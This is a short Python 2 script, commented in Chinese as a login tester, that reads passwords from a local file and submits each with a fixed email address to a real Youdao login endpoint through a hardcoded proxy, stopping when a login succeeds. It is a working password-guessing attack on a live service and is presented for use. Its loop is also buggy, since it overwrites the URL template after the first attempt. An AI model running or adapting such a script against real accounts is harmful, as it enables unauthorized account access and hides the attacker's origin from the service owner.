#coding:utf-8
import requests

# 需要测试的登陆地址
url = "https://ke.youdao.com/login/acc/login?app=mobile&product=DICT&tp=urstoken&cf=7&show=true&format=json&username=%s&password=%s&um=true"
url_ip="https://10.234.8.31"
res = ""
f = open("d:\\pass.txt")
for pwd in f:
    print pwd.strip("\n")
    proxies = {"http":"111.13.65.253:80"}
    url = url % ("huihuitestecho@163.com",pwd.strip("\n"))
    print url
    res = requests.get(url, proxies=proxies).text
    if "username" in res:
        print res
        break


